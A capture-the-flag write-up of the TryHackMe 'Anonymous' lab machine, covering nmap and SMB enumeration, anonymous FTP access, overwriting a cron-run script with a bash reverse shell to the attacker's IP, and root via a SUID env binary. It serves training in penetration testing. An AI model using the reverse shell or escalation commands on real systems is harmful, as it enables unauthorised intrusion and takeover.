---
title: Anonymous - TryHackMe
date: 2020/08/13
categories:
  - [pentesting, writeups]
---

Hello there! Today I am going to walk you through the Anonymous machine on [TryHackMe](https://tryhackme.com/room/anonymous).

Let’s first (as always) export the IP to a global variable, for easier reference later on. So when ever you see \$IP I am talking about the machines IP.

```bash
export IP={Machine IP}
```

## Enumeration

Let’s get started with an nmap scan:

```plain
nmap -T4 -A -p- $IP
```

Those are the results:

```plain
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 13:27 EDT
Nmap scan report for 10.10.115.205
Host is up (0.096s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.25.68
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=8/9%OT=21%CT=1%CU=35520%PV=Y%DS=2%DC=T%G=Y%TM=5F303224
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=F9%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11N
OS:W6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R
OS:=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S
OS:)

Network Distance: 2 hops
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2s, deviation: 1s, median: -2s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2020-08-09T17:27:57+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-08-09T17:27:57
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   41.06 ms  10.9.0.1
2   114.16 ms 10.10.115.205

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.36 seconds
```

We can already see that there are three interesting services running. SMB, FTP and SSH. I chose to have a look at SMB first and then work my way up.<br/>In the scan results we can see that guest login is allowed, so let’s make use of that.

First I used SMBMap to see what share we could access:

```plain
root@hades      :~# smbmap $IP
[+] Guest session       IP: 10.10.115.205:445   Name: 10.10.115.205
        Disk                                                    Permissions Comment
    ----                                                    ----------- -------
    print$                                              NO ACCESS   Printer Drivers
    pics                                                READ ONLY   My SMB Share Directory for Pics
    IPC$                                                NO ACCESS   IPC Service (anonymous server (Samba, Ubuntu))
```

The “pics” share seems interesting, but apparently this was a rabbit hole, there were literally just a few pictures on there.

So let’s move on to the next port. It is an FTP server with anonymous login enabled (always look closely at you scan results). I just logged in with the command line, like this:

```plain
root@hades      :~/ctf/thm/anonymous# ftp 10.10.115.205 21
Connected to 10.10.115.205.
220 NamelessOne's FTP Server!
Name (10.10.115.205:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

As the password I entered nothing and just pressed enter. We can move around the FTP server just like on a Linux machine and after looking around for a bit, I found three files:

```plain
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh
-rw-rw-r--    1 1000     1000         1763 Aug 09 17:45 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
```

You can easily download them with “get” and then the file name (get [‘File name’]).

## Gaining Access

Only the bash script really is interesting for us. The todo just says to remove the anonymous login and the log is being generated by the clean.sh script. The script itself deletes all files from the /tmp directory, when run. Potentially this is a cron job?<br/>A cron job is something you can set up on your Linux machine to do tasks e.g. daily, monthly etc.

So if we can override the script we can let it do whatever we want (Spoiler: we can).

Just create a shell scipt and insert some kind of shell. I used this simple reverse shell, just insert you own IP:

```bash
#!/bin/bash

bash -i >& /dev/tcp/[Your tun0 IP]/8080 0>&1
```

And upload it with “put” and then the file name of the local file.

Then set up a netcat listener on you machine:

```bash
nc -lnvp 8080
```

Now you just need to wait a few seconds and you should be able to see a shell pop up, where you set up the listener.

### User Flag

You can now just cat out the user flag, which is located at /home/anonymous/user.txt .

## Privilege Escalation

I followed my routine and downloaded LinPeas on the target machine.<br/>It found an “env” SUID, which if you look it up on [GTFOBins](https://gtfobins.github.io/gtfobins/env/) is easily exploitable. Just run this simple command:

```bash
env /bin/sh -p
```

And there you go, you have root.

### Root Flag

And again you can just cat out the root flag, which is located at /root/root.txt this time.

## The End

And there you have it! I hope you had fun, I know I did 🦄
